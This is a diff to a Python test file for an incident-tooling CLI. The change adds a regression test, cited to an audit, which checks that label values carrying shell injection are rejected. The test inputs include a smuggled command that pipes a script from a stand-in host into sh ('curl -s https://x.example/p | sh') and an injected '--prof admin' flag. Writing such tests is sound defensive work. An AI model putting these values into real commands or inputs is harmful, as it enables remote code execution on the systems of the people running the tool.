@@ -189,14 +189,26 @@ def test_a_malformed_label_is_rejected():
 
 
 def test_a_label_value_may_contain_equals_signs(tmp_path):
-    """A DSN or a selector routinely carries '='. Splitting on the FIRST one is the whole point."""
+    """A selector routinely carries '='. Splitting on the FIRST one is the whole point."""
     out_file = tmp_path / "r.json"
     assert main([
-        "run", "--incident", "inc-005", "--label", "dsn=postgresql://u:p@h/db?sslmode=require",
+        "run", "--incident", "inc-005", "--label", "selector=app=payments,tier=db",
         "--json", str(out_file),
     ]) == 0
     labels = json.loads(out_file.read_text(encoding="utf-8"))["alert"]["labels"]
-    assert labels["dsn"].endswith("?sslmode=require")
+    assert labels["selector"] == "app=payments,tier=db"
+
+
+def test_a_label_that_is_not_a_plain_name_is_dropped_and_reported(tmp_path):
+    """2026-09-27 audit: `deployment='x; curl evil | sh'` reached a printed command."""
+    out_file = tmp_path / "r.json"
+    assert main([
+        "run", "--incident", "inc-002", "--label", "deployment=checkout; curl -s https://x.example/p | sh",
+        "--label", "ecs_service=svc --prof admin", "--json", str(out_file),
+    ]) == 0
+    alert = json.loads(out_file.read_text(encoding="utf-8"))["alert"]
+    assert "deployment" not in alert["labels"] and "ecs_service" not in alert["labels"]
+    assert sorted(alert["rejected_labels"]) == ["deployment", "ecs_service"]
 
 
 def test_json_report_is_written_and_is_the_full_report(tmp_path, capsys):
